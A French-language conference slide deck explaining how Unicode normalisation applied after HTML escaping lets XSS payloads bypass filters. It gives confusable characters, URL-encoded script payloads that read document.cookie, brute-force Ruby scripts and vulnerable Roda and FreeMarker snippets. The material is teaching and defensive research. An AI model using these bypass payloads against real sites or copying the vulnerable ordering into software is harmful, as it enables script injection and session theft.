---
marp: true
theme: acceis
class: invert
paginate: true
header: '![height:20px](themes/logo_acceis_white.svg)'
footer: '**XSS Unicode** - 14/05/2024 - Alexandre ZANNI (noraj)'
---
# XSS Unicode
## Tout est devenu normal

![height:200px](themes/logo_acceis_white.svg)

---

L'entrée utilisateur est échappée, c'est pas vuln, ya pas de XSS.

```html
&lt;script&gt;alert(document;domain)&lt;/script&gt;
```

Vraiment ?

---

# Le classique
## Contournement par normalisation (décomposition compatible)

---

## Caractères candidats

Contourner `<` (U+003C, _LESS-THAN SIGN_)

- `﹤`, U+FE64, _SMALL LESS-THAN SIGN_
- `＜`, U+FF1C, _FULLWIDTH LESS-THAN SIGN_

Contourner `>` (U+003E, _GREATER-THAN SIGN_)

- `﹥`, U+FE65, _SMALL GREATER-THAN SIGN_
- `＞`, U+FF1E, _FULLWIDTH GREATER-THAN SIGN_

---

#### Normalisation

```ruby
text = '﹤' # U+FE64
text.unicode_normalize(:nfkc) # => "<" (U+003C)
text.unicode_normalize(:nfkd) # => "<" (U+003C)
text = '＜' # U+FF1C
text.unicode_normalize(:nfkc) # => "<" (U+003C)
text.unicode_normalize(:nfkd) # => "<" (U+003C)
```

---

#### Représentation hexadécimale et encodage URL

```text
➜ unisec hexdump ＜ --enc utf8
ef bc 9c

➜ ctf-party ＜ urlencode
%EF%BC%9C

➜ unisec hexdump ＞ --enc utf8
ef bc 9e

➜ ctf-party ＞ urlencode
%EF%BC%9E
```

---

#### Encodage URL de la charge utile

`＜script＞alert(document.cookie)＜/script＞`

⬇️

`%EF%BC%9Cscript%EF%BC%9Ealert(document.cookie)%EF%BC%9C/script%EF%BC%9E`

---

#### Charge utile échappée

`<script>alert(document.cookie)</script>`

⬇️

`&lt;script&gt;alert(document.cookie)&lt;/script&gt;`

---

#### Contournement

`＜script＞alert(document.cookie)＜/script＞`

⬇️

`<script>alert(document.cookie)</script>`

---

#### Exemple d'application (Roda - Ruby)

```ruby
response.write CGI.escapeHTML(r.params['name']).unicode_normalize(:nfkc)
```

---

#### Exemple d'application (FreeMaker - Java)

```java
${normalizeNFKC(request.queryParameters.name!?html)}
```

---

Le problème est le mauvais ordonnancement des étapes de sécurité.

Échappement HTML avant normalisation Unicode au lieu d'après.

---

#### Cas d'usage

- Mauvais ordonnancement des étapes de filtrage par le dev.
- Normalisation faite implicitement par le cadriciel
- SGBD qui normalise automatiquement lorsque la chaine de caractère est stockée (ex : dans une colonne VARCHAR)

---

## Bonus

Contourner `"` (U+0022, _QUOTATION MARK_)

- `＂`, U+FF02, _FULLWIDTH QUOTATION MARK_

Contourner `'` (U+0027, _APOSTROPHE_)

- `＇`, U+FF07, _FULLWIDTH APOSTROPHE_

Contourner `&` (U+0026, _AMPERSAND_)

- `﹠`, U+FE60, _SMALL AMPERSAND_
- `＆`, U+FF06, _FULLWIDTH AMPERSAND_

---

#### Pour aller plus loin

- [Site AVCS](https://acceis.github.io/avcs-website/)
- [Code Snippet n°2](https://github.com/Acceis/vulnerable-code-snippets/tree/master/case-transformation-collision)
- [Solution Snippet n°2](https://www.acceis.fr/solution-de-lextrait-de-code-vulnerable-n2/)
- [UTR #15 - Formes de normalisation](https://unicode.org/reports/tr15/#Norm_Forms)
- [Attaques Unicode – Rump BreizhCTF 2k22 (article)](https://www.acceis.fr/attaques-unicode-rump-breizhctf-2k22/)
- [Attaques Unicode – Rump BreizhCTF 2k22 (diapo)](https://github.com/Acceis/rump-unicode)

---

# Face, je gagne, pile, tu perds
## Contournement par normalisation (décomposition canonique)

---

Et si c'est une normalisation NFC ou NFD et pas NFKC ou NFKD ?

Les caractères précédents ne sont pas interprétés comme de l'HTML, que faire ?

---

Source | NFD | NFC
--- | --- | ---
`ô` (U+00F4) | `o` (U+006F) + `̂` (U+0302) | `ô` (U+00F4)
`o` (U+006F) + `̂` (U+0302) | `o` (U+006F) + `̂` (U+0302) | `ô` (U+00F4)

---

- `ô` (U+00F4) ➡️ NFD ➡️ `o` (U+006F) + `̂` (U+0302)
- `o` (U+006F) + `̂` (U+0302) ➡️ NFC ➡️ `ô` (U+00F4)

---

## NFC
### Contexte HTML

Qu'est-ce qui pourrait se composer / décomposer avec `>` ?

---

Résoudre l'équation :

```text
NFC('>' + x) = !('>')…
```

---

```ruby
def uints2str(arr)
  arr.pack('U*')
end

(1..128591).each do |i|
  begin
    candidat = uints2str('>'.codepoints + [i]).unicode_normalize(:nfc)
  rescue
    candidat = '>?'
  end
  unless candidat[0] == '>'
    puts "NFC(> + #{uints2str([i])} (#{i})) = #{candidat} (#{candidat.codepoints})"
  end
end
```

```text
NFC(> + ̸ (824)) = ≯ ([8815])
```

---

U+0338 (_COMBINING LONG SOLIDUS OVERLAY_)

But : annuler la fin de balise et s'injecter dedans

---

```html
<textarea id=noraj>INJECTION_ICI</textarea>
<a href="https://pwn.by/noraj">INJECTION_ICI</a>
<!-- ⬇️ injection -->
<textarea id=noraj>U+0338 autofocus onfocus=alert(document.cookie) </textarea>
<a href="https://pwn.by/noraj">U+0338 onclick=alert(document.cookie) </a>
<!-- ⬇️ normalisation -->
<textarea id=noraj≯ autofocus onfocus=alert(document.cookie) </textarea>
<a href="https://pwn.by/noraj"≯ onclick=alert(document.cookie) </a>
```

`̸ autofocus onfocus=alert(document.cookie) `

---

#### Exemple d'application (Roda - Ruby)

```ruby
response.write ('<textarea id=noraj>' +
                CGI.escapeHTML(r.params['param']) +
                '</textarea>').unicode_normalize(:nfc)
```

---

#### Exemple d'application (FreeMaker - Java)

```java
${normalizeNFC("<textarea id=noraj>" + request.queryParameters.param!?html + "</textarea>")}
```

---

## NFC
### Contexte attribut HTML

Qu'est-ce qui pourrait se composer / décomposer avec `"` ?

---

Résoudre l'équation :

```text
NFC('"' + x) = !('"')…
```

➡️ rien (pareil pour `'`)

---

## NFD
### Contexte attribut HTML

---

Résoudre l'équation :

```text
NFD(x) = '>' + y || y + '>'
```

---

```ruby
require 'cgi'

def uints2str(arr)
  arr.pack('U*')
end

(1..128591).each do |i|
  begin
    candidat = CGI.escapeHTML(uints2str([i])).unicode_normalize(:nfd)
  rescue
    candidat = '?'
  end
  if candidat.include?('>')
    puts "NFD(#{uints2str([i])} (#{i})) = #{candidat} (#{candidat.codepoints})"
  end
end
```

```text
NFD(≯ (8815)) = ≯ ([62, 824])
```

---

U+226F (_NOT GREATER-THAN_)

But : ajouter une fin de balise pour s'échapper du contexte

---

```html
<img src="image" alt="INJECTION_ICI">
<!-- ⬇️ injection -->
<img src="image" alt="U+226F + charge utile">
<!-- ⬇️ normalisation -->
<img src="image" alt="≯ + charge utile ">
```

2 problèmes

---

## 2 problèmes

- comme `"` n'est pas fermé, le `<` se trouve toujours dans l'attribut, on ne s'est pas échappé
- quand bien même on se serait échappé, il faudrait probablement des `<` et potentiellement des `"` pour former une charge utile valide genre une nouvelle balise

---

Résoudre l'équation :

```text
NFD(x) = '"' + y || y + '"'
```

➡️ rien (pareil pour `'`)

---

## NFD
### Contexte HTML

---

Pareil que précédemment pour l'ouverture de balise

`NFD(≮ (8814)) = ≮ ([60, 824])`

On peut créer des balises, mais `>💩` est ok autant `<💩` formera une balise invalide

`≮img` ➡️ `<💩img`

---

Il est quand même possible d'exploiter une balise personnalisée avec certains attributs

```html
<!-- sans interaction -->
<noraj autofocus tabindex=1 onfocus="alert('autofocus mais souvent bloqué car un autre élément l a déjà')"></noraj>

<!-- avec interaction -->
<noraj onclick="alert('balise pas fermée, elle va capturer les balsies suivantes')">

<noraj id="noraj" onfocus="alert('ajouter une ancre pour forcer le focus')"></noraj>
```

---

```html
<div>INJECTION_ICI</div><p>Je suis du contenu</p>
<!-- ⬇️ injection -->
<div>U+226e onclick=alert(document.domain) </div><p>Je suis du contenu</p>
<!-- ⬇️ normalisation -->
<div>≮ onclick=alert(document.domain) </div><p>Je suis du contenu</p>
```

---

Problème ? Pour être reconnu comme une balise par le parseur HTML, le chevron doit être suivi d'une lettre dans la plage ASCII

Autrement dit `<💩 = balise HTML valide` si `💩 = [a-zA-Z]` donc ici `<U+0338` est reconnu comme du texte et pas une balise.

Source : tkt j'ai testé, flemme de lire la spec HTML

---

## Récap

- **NFKC & NFKD** : contournement pour `<>"'&`
- **NFC** : contournement pour `>`, rien pour `"'`, pas de cas pratique pour `<`
- **NFD** : rien pour `"'`, contournement pour `>` mais sans pouvoir en faire grand-chose, contournement pour `<` mais inutilisable

---

# Ｍе𝐫𝓬𝒾 ρه𝖚𝓻 ∨೦𝗍ꮁе 𝞪𝕥𝐭ⅇ𝓷𝓽ꙇꬽ𝒏
